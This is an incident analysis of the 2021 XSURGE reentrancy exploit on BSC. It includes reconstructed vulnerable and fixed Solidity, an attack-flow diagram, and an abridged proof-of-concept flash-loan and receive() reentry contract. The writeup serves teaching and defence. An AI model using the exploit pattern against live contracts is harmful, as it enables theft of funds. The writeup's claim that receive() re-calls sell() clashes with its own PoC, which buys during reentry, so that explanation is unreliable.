# XSURGE — sell() Reentrancy ETH Double-Withdrawal Analysis

| Field | Details |
|------|------|
| **Date** | 2021-08-16 |
| **Chain** | BSC (Binance Smart Chain) |
| **Protocol** | XSURGE Token |
| **Loss** | ~$5,400,000 |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed (fork block: 10,087,723) |
| **Vulnerable Contract** | [0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21](https://bscscan.com/address/0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21) (XSURGE Token) |
| **Root Cause** | The sell() function re-enters via the receive() hook during BNB transfer, allowing repeated sell() calls before the balance is updated |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-08/XSURGE_exp.sol) |

---
## 1. Vulnerability Overview

The `sell()` function of the XSURGE token accepts XSURGE and sends BNB in return. When BNB is transferred, the recipient contract's `receive()` function is triggered, which could re-invoke `sell()`. Since the XSURGE balance deduction inside `sell()` occurs after the BNB transfer, a reentrancy call could withdraw BNB again using the original (non-decremented) balance. The attacker borrowed 10,000 WBNB via flash loan, purchased XSURGE, then re-entered `sell()` 7 times to steal approximately $5.4M.

---
## 2. Vulnerable Code Analysis

### 2.1 sell() — Balance Deduction After BNB Transfer (CEI Violation)

```solidity
// ❌ XSURGE Token @ 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21
function sell(uint256 tokenAmount) external returns (bool) {
    address seller = msg.sender;
    require(_balances[seller] >= tokenAmount, "Insufficient balance");

    // BNB calculation
    uint256 bnbToReturn = calculateBNBToReceive(tokenAmount);

    // ❌ BNB transferred first → reentrancy possible via receive() hook
    (bool success,) = payable(seller).call{value: bnbToReturn, gas: 40_000}("");
    require(success, "BNB transfer failed");

    // ❌ Balance deduction after BNB transfer — repeated sell() with original balance on reentry
    _balances[seller] -= tokenAmount;
    _totalSupply -= tokenAmount;

    return true;
}
```

**Fixed Code**:
```solidity
// ✅ CEI pattern applied — balance deducted before BNB transfer
function sell(uint256 tokenAmount) external nonReentrant returns (bool) {
    address seller = msg.sender;
    require(_balances[seller] >= tokenAmount, "Insufficient balance");

    uint256 bnbToReturn = calculateBNBToReceive(tokenAmount);

    // ✅ State updated first (Effect)
    _balances[seller] -= tokenAmount;
    _totalSupply -= tokenAmount;

    // ✅ ETH/BNB transfer last (Interaction)
    (bool success,) = payable(seller).call{value: bnbToReturn, gas: 40_000}("");
    require(success, "BNB transfer failed");

    return true;
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**XSURGE Token_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: sell() function re-enters via receive() hook during BNB transfer, allowing repeated sell() before balance update
    function sell(uint256 arg0) external {}  // 0xe4849b32  // ❌ Vulnerability
```

## 3. Attack Flow

```
┌──────────────────────────────────────────────────────────┐
│ Step 1: PancakeSwap flash loan 10,000 WBNB               │
│ ipancake.swap(0, 10000e18, this, "0x00")                 │
│ PancakePair @ 0x0eD7e52944161450477ee417DE9Cd3a859b14fD0 │
└─────────────────────┬────────────────────────────────────┘
                      │ pancakeCall() callback
┌─────────────────────▼────────────────────────────────────┐
│ Step 2: Unwrap WBNB → Purchase XSURGE                    │
│ wbnb.withdraw(10000e18)                                  │
│ Surge_Address.call{value: 10000e18}("")  // buy          │
│ XSURGE @ 0xE1E1Aa58983F6b8eE8E4eCD206ceA6578F036c21     │
└─────────────────────┬────────────────────────────────────┘
                      │
┌─────────────────────▼────────────────────────────────────┐
│ Step 3: surge.sell(surgeBalance) — 1st call              │
│ → receive() triggered during BNB transfer                │
└─────────────────────┬────────────────────────────────────┘
                      │ receive() reentrance (up to 6 iterations)
┌─────────────────────▼──────────────────────────────────┐
│ Step 4: receive() → surge.sell() repeated reentry       │
│ Double-withdraw BNB with same XSURGE (balance not yet   │
│ decremented); loop exits after 6 iterations via counter │
└─────────────────────┬──────────────────────────────────┘
                      │
┌─────────────────────▼──────────────────────────────────┐
│ Step 5: Re-wrap to WBNB → Repay 10,030 WBNB             │
│ Transfer surplus WBNB to attacker wallet                │
└────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// pancakeCall() — flash loan callback
function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    wbnb.withdraw(wbnb.balanceOf(address(this)));

    // Purchase XSURGE (BNB → XSURGE)
    (bool buy_successful,) = payable(Surge_Address).call{value: address(this).balance, gas: 40_000}("");

    // sell() called 7 times — double-withdraw BNB via reentrancy
    surge.sell(surge.balanceOf(address(this)));  // 1st sell → receive() reentry
    // ... (7 total, controlled by time counter)

    wbnb.deposit{value: address(this).balance}();
    wbnb.transfer(Pancake_Pair_Address, 10_030 * 1e18); // repay
    wbnb.transfer(mywallet, wbnb.balanceOf(address(this)));
}

// receive() — reentry point (loops while time < 6)
receive() external payable {
    if (msg.sender == Surge_Address && time < 6) {
        (bool buy_successful,) = payable(Surge_Address).call{value: address(this).balance, gas: 40_000}("");
        time++;
    }
}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | sell() transfers BNB before deducting balance — double-withdrawal on reentry via receive() | CRITICAL | CWE-841 |
| V-02 | Missing nonReentrant guard | HIGH | CWE-841 |

---
## 6. Remediation Recommendations

```solidity
// ✅ CEI pattern + nonReentrant
// ✅ Set low gas limit on ETH/BNB transfer (prevents reentrancy)

function sell(uint256 tokenAmount) external nonReentrant returns (bool) {
    // Effect: deduct balance first
    _balances[msg.sender] -= tokenAmount;
    _totalSupply -= tokenAmount;

    uint256 bnbToReturn = calculateBNBToReceive(tokenAmount);

    // Interaction: transfer last
    // Gas capped at 2300 — insufficient gas for reentrancy
    (bool success,) = payable(msg.sender).call{value: bnbToReturn, gas: 2300}("");
    require(success, "BNB transfer failed");
    return true;
}
```

---
## 7. Lessons Learned

- **Native token (ETH/BNB) transfers execute the recipient's `receive()` or `fallback()`.** All state changes must be finalized before the transfer.
- **Even limiting reentry with a counter (time < 6), six double-withdrawals are devastating.** The root cause (balance not yet decremented) must be fixed.
- **The CEI pattern is the fundamental solution to reentrancy attacks.** `nonReentrant` is a supplementary measure, not a substitute.